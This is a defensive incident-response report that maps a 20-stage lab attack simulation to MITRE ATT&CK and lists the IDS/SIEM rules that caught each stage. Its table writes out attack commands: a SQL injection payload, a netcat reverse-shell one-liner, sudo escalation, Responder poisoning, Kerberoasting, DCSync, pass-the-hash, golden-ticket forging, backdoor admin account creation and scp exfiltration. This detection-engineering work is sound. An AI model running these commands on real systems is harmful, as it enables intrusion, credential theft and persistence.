# MITRE ATT&CK Enterprise Framework Mapping

> **Incident Identifier:** `INC-2026-1018-ALPHA`  
> **Report Identifier:** `IR-2026-1018-MITRE`  
> **Framework Version:** MITRE ATT&CK Enterprise v15.1  
> **Lead Incident Responder:** Manichand Gupta  
> **Evaluation Scope:** 20 Attack Simulation Stages across 9 ATT&CK Tactics

[![Attack Simulation 20-Stage Kill Chain Roadmap](../06-Resources/diagrams/Attack%20Simulation%2020-Stage%20Kill%20Chain%20Roadmap.png)](../06-Resources/diagrams/Attack%20Simulation%2020-Stage%20Kill%20Chain%20Roadmap.png)
*Figure 1: Complete 20-stage attack simulation lifecycle mapped across the 3 investigation cases, showing detection statuses and tool vectors.*

---

## 📑 ATT&CK Master Alignment Matrix

The table below maps all 20 adversary stages across their corresponding MITRE ATT&CK tactics, techniques, adversary execution commands, victim hosts, detection statuses, and primary defensive sensor rules:

| Stg | ATT&CK Tactic | Technique Name | Sub-Technique ID | Adversary Execution Vector | Target Asset | Detection Status | Defensive Sensor & Rule ID |
|:---:|:---|:---|:---:|:---|:---|:---:|:---|
| **01** | Reconnaissance | Active Scanning: Port Scanning | `T1595.001` | `nmap -sS -sV -O -p- 192.168.56.30` | DVWA (`192.168.56.30`) | **Direct Detection** | Suricata SIDs `3400001`, `3400002` / Wazuh Rule `100410` |
| **02** | Credential Access | Brute Force: Password Guessing | `T1110.001` | `python3 dvwa_bruteforce.py` (User-Agent: `python-requests`) | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh Rule `100213` (Level 10) / Suricata SID `2000547` |
| **03** | Initial Access | Exploit Public-Facing Application | `T1190` | `1' UNION SELECT user, password FROM users-- -` | DVWA (`192.168.56.30`) | **Direct Detection** | Suricata SID `2010963` (`ET WEB_SERVER SELECT USER`) / Wazuh `31106` |
| **04** | Credential Access | Brute Force: Password Cracking | `T1110.002` | `hashcat -m 0 hashes.txt rockyou.txt` | Local Kali (`192.168.232.135`) | **Offline Gap (DG-04)** | *Inherent Offline Gap (Zero Victim Telemetry)* |
| **05** | Persistence | Server Software Component: Web Shell | `T1505.003` | Upload `shell.php` via `/vulnerabilities/upload/` | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh Rule `100199` / Suricata SID `2019284` / Auditd `execve` |
| **06** | Execution | Command & Scripting Interpreter: Unix Shell | `T1059.004` | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc ...` | DVWA (`192.168.56.30`) | **Direct Detection** | Suricata SID `3400020` / Auditd `stty sane` (Rule `web_process_creation`) |
| **07** | Privilege Escalation | Abuse Elevation Control: Sudo Caching | `T1548.003` | `sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'` | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh PAM Rule `5402` (`sudo to ROOT`) / Auditd `execve` |
| **08** | Persistence | Account Manipulation: SSH Authorized Keys | `T1098.004` | `echo "ssh-ed25519..." >> /root/.ssh/authorized_keys` | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh Rule `550` (FIM) / Rule `5715` / Rule `100220` (`bashcmd`) |
| **09** | Discovery | Remote System Discovery: Network Sweep | `T1018` | `nmap -sS -p 22,80,135,445 192.168.56.0/24` | Internal Subnet | **Logging Gap (DG-09)** | Suricata `ens37` wire alerts / Wazuh Rule `100220` (`nmap -sV -O ...`) |
| **10** | Credential Access | Adversary-in-the-Middle: LLMNR/NBT-NS | `T1557.001` | `python3 /opt/Responder/Responder.py -I ens37 -rdw` | Win10 (`192.168.56.20`) | **Direct Detection** | Wazuh Rule `100220` (`bashcmd` uid:0 Responder) / Sysmon `rundll32` |
| **11** | Credential Access | Brute Force: Password Cracking | `T1110.002` | `hashcat -m 5600 win10.hash rockyou.txt` | Local Kali (`192.168.232.135`) | **Offline Gap (DG-11)** | *Inherent Offline Gap (Zero Victim Telemetry)* |
| **12** | Discovery | Permission Groups Discovery: Domain Groups | `T1087.002` | `bloodhound-python -u win10 -p Secur3Lab! -d ad.lab -c All` | `PC-DC` (`192.168.56.10`) | **Logging Gap (DG-12)** | Wazuh Rule `5715` / Wazuh Rule `100220` (`bloodhound.py`) |
| **13** | Credential Access | Steal or Forge Kerberos Tickets: Kerberoasting | `T1558.003` | `python3 GetUserSPNs.py ad.lab/win10:Secur3Lab! -request` | `PC-DC` (`192.168.56.10`) | **Direct Detection** | Suricata SID `2019922` / Wazuh Rule `100220` (`GetUserSPNs.py`) & Rule `5715` |
| **14** | Credential Access | OS Credential Dumping: DCSync | `T1003.006` | `python3 secretsdump.py 'ad.lab/HANK_SHERMAN:Password123@...'` | `PC-DC` (`192.168.56.10`) | **Operational Alert** | Windows EID `4662` / Wazuh Rule `100220` (`secretsdump.py`) & Rule `5715` |
| **15** | Lateral Movement | Use Alternate Auth: Pass the Hash | `T1550.002` | `python3 wmiexec.py -hashes :... Administrator@192.168.56.10` | `PC-DC` (`192.168.56.10`) | **Direct Detection** | Windows EID `4624` / Wazuh Rule `100613` & Rule `100220` (`wmiexec.py`) |
| **16** | Credential Access | Steal or Forge Kerberos Tickets: Golden Ticket | `T1558.001` | `python3 ticketer.py -nthash 611a8... -domain-sid S-1-5-21...` | Linux Pivot Host | **Operational Alert** | Wazuh Rule `100220` (`ticketer.py`) & Rule `5715` / Event ID `4769` |
| **17** | Persistence | Create Account: Domain Account | `T1136.002` | `cmd.exe /Q /c net user backdoor P@ssw0rd123! /add /domain` | `PC-DC` (`192.168.56.10`) | **Direct Detection** | Wazuh Rule `60108` (Windows EID 4720 user creation) |
| **17** | Persistence | Account Manipulation: Domain Groups | `T1098` | `cmd.exe /Q /c net group "Domain Admins" backdoor /add /domain` | `PC-DC` (`192.168.56.10`) | **Direct Detection** | Wazuh Rule `60109` (Windows EID 4728 group addition) |
| **18** | Collection | Data from Local System: Staging | `T1005` | `cmd.exe /Q /c net user /domain > C:\Windows\Temp\domain_users.txt` | `PC-DC` & `Win10` | **Direct Detection** | Sysmon EID `1` (Process creation) & EID `11` (File creation) |
| **19** | Exfiltration | Exfiltration Over C2 Channel: SCP Burst | `T1041` | `scp -i id_ed25519 root@192.168.56.30:/tmp/*.txt .` | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh SSHD Rule `5715` Rate Anomaly (6 sessions in 570 ms) |
| **20** | Impact | Internal Defacement: Desktop Wallpaper | `T1491.001` | `reg add "HKCU\Control Panel\Desktop" /v Wallpaper /d "hacked.bmp"` | `PC-DC` & `Win10` | **Direct Detection** | Sysmon EID `13` (Registry value set) / Wazuh Rule `92041` |
| **20** | Impact | Data Encrypted for Impact: Simulated Extortion | `T1486` | Dropped `README_HACKED.txt` & dummy encrypted `.enc` files | `PC-DC` & `Win10` | **Direct Detection** | Sysmon EID `11` (File drop tracking on desktop) |
| **20** | Impact | System Shutdown / Reboot: Forced Restart | `T1529` | `cmd.exe /Q /c shutdown /r /t 0` | `PC-DC` & `Win10` | **Direct Detection** | Sysmon EID `1` / Windows System Event Log EID `1074` |

---

## 📊 Tactical Coverage & Performance Metrics

```text
Total MITRE ATT&CK Tactics Exercised:       9
Total Unique ATT&CK Techniques Tested:      20 (including sub-techniques)
Direct Target Detections:                  14 Stages (70.0%)
Operational Incident Tickets Delivered:    16 Stages (80.0%)
Documented Inherent Offline Gaps:           2 Stages (10.0% - DG-04, DG-11)
Documented Protocol Logging Gaps:           2 Stages (10.0% - DG-09, DG-12)
Detection Engine Rule Execution Drops:      0 Stages (0.0% - all rules evaluated; 0 syntax/engine drops)
(Note: DC EIDs 4662/4769 logged at Level 5 but unforwarded under Level >= 8 SOAR gate filter)
```

### Breakdown by ATT&CK Tactic
1. **Reconnaissance (`TA0043`):** 1 Technique (`T1595.001` Active Scanning) -> **100% Detected** via Suricata NIDS.
2. **Initial Access (`TA0001`):** 1 Technique (`T1190` Exploit Public-Facing Application) -> **100% Detected** via Suricata SQL injection signatures.
3. **Execution (`TA0002`):** 1 Technique (`T1059.004` Unix Shell) -> **100% Detected** via Auditd `execve` tracking and Suricata C2 socket alerts.
4. **Persistence (`TA0003`):** 3 Techniques (`T1505.003` Web Shell, `T1098.004` SSH Keys, `T1136.002` Domain Account) -> **100% Detected** via Wazuh File Integrity Monitoring, Linux PAM, and Windows Event ID 4720.
5. **Privilege Escalation (`TA0004`):** 1 Technique (`T1548.003` Sudo Caching) -> **100% Detected** via Wazuh PAM Rule 5402 (`sudo to ROOT`).
6. **Credential Access (`TA0006`):** 6 Techniques (`T1110.001` Brute Force, `T1110.002` Hash Cracking, `T1557.001` Poisoning, `T1558.003` Kerberoasting, `T1003.006` DCSync, `T1558.001` Golden Ticket) -> **2 Direct Detections / 2 Pivot-Only Alerts / 2 Offline Gaps**.
7. **Discovery (`TA0007`):** 2 Techniques (`T1018` Remote System Discovery, `T1087.002` Domain Groups) -> **2 Target Logging Gaps** (Detected via promiscuous wire capture and pivot SSH session tracking).
8. **Lateral Movement (`TA0008`):** 1 Technique (`T1550.002` Pass the Hash) -> **100% Detected** via Windows Security Event ID 4624 (Logon Type 3 NTLM) and Wazuh WMI fan-out correlation Rule 100613.
9. **Collection (`TA0009`):** 1 Technique (`T1005` Data from Local System) -> **100% Detected** via Sysmon EID 1 process tracking and EID 11 file staging.
10. **Exfiltration (`TA0010`):** 1 Technique (`T1041` Exfiltration Over C2 Channel) -> **100% Detected** via Wazuh SSHD administrative authentication rate anomaly correlation.
11. **Impact (`TA0040`):** 3 Techniques (`T1491.001` Internal Defacement, `T1486` Data Encrypted for Impact, `T1529` System Shutdown/Reboot) -> **100% Detected** via Sysmon registry monitoring (EID 13) and Windows shutdown auditing.
